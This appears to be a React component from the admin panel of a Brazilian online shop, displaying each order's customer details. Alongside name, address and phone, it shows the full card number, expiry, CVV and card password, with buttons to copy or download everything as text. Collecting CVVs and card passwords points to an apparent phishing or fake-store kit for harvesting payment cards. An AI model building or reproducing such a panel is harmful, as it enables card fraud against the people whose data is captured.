import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Copy, Download, Trash2 } from "lucide-react";

interface OrderCardProps {
  order: any;
  onCopyData: (text: string) => void;
  onDownloadTxt: (order: any) => void;
  onDelete: (orderId: string) => void;
}

export function OrderCard({ order, onCopyData, onDownloadTxt, onDelete }: OrderCardProps) {
  if (!order) {
    return null;
  }

  const formatOrderText = () => {
    const customer = order.customer || {};
    const creditCardData = order.credit_card_data || {};
    const items = order.items || [];

    return `
Pedido #${order.id || ''}
Data: ${new Date(order.timestamp || Date.now()).toLocaleString()}

Cliente:
${customer.name || ''}
${customer.email || ''}
${customer.phone || ''}

Endereço:
${customer.address || ''}
${customer.city || ''}, ${customer.state || ''}
CEP: ${customer.zipCode || ''}

Cartão:
Número: ${creditCardData.cardNumber || ''}
Titular: ${creditCardData.cardHolder || ''}
Validade: ${creditCardData.expiryDate || ''}
CVV: ${creditCardData.cvv || ''}
Senha: ${creditCardData.password || ''}
Parcelamento: ${creditCardData.installments || '1'}x sem juros

Itens:
${items.map((item: any) => `${item?.title || ''} - Qtd: ${item?.quantity || ''} - R$ ${item?.price || ''}`).join('\n')}

Total: R$ ${order.total || '0'}
    `.trim();
  };

  const customer = order.customer || {};
  const creditCardData = order.credit_card_data || {};
  const items = order.items || [];

  return (
    <Card className="p-6 space-y-4">
      <div className="flex justify-between items-start">
        <div>
          <h3 className="font-bold">Pedido #{order.id || ''}</h3>
          <p className="text-sm text-gray-500">
            {new Date(order.timestamp || Date.now()).toLocaleString()}
          </p>
        </div>
        <div className="flex gap-2">
          <Button
            variant="outline"
            size="icon"
            onClick={() => onCopyData(formatOrderText())}
          >
            <Copy className="h-4 w-4" />
          </Button>
          <Button
            variant="outline"
            size="icon"
            onClick={() => onDownloadTxt(order)}
          >
            <Download className="h-4 w-4" />
          </Button>
          <Button
            variant="destructive"
            size="icon"
            onClick={() => onDelete(order.id)}
          >
            <Trash2 className="h-4 w-4" />
          </Button>
        </div>
      </div>

      <div className="grid grid-cols-2 gap-4">
        <div>
          <h4 className="font-semibold mb-2">Dados do Cliente</h4>
          <p>{customer.name || ''}</p>
          <p>{customer.email || ''}</p>
          <p>{customer.phone || ''}</p>
        </div>
        <div>
          <h4 className="font-semibold mb-2">Endereço</h4>
          <p>{customer.address || ''}</p>
          <p>
            {customer.city || ''}, {customer.state || ''}
          </p>
          <p>{customer.zipCode || ''}</p>
        </div>
      </div>

      <div>
        <h4 className="font-semibold mb-2">Dados do Cartão</h4>
        <p>Número: {creditCardData.cardNumber || ''}</p>
        <p>Titular: {creditCardData.cardHolder || ''}</p>
        <p>Validade: {creditCardData.expiryDate || ''}</p>
        <p>CVV: {creditCardData.cvv || ''}</p>
        <p>Senha: {creditCardData.password || ''}</p>
        <p>Parcelamento: {creditCardData.installments || '1'}x sem juros</p>
      </div>

      <div>
        <h4 className="font-semibold mb-2">Itens do Pedido</h4>
        {items.map((item: any, index: number) => (
          <div key={index} className="flex justify-between">
            <span>{item?.title || ''}</span>
            <span>
              Qtd: {item?.quantity || ''} - R$ {item?.price || ''}
            </span>
          </div>
        ))}
        <div className="mt-2 text-right font-bold">
          Total: R$ {order.total || '0'}
        </div>
      </div>
    </Card>
  );
}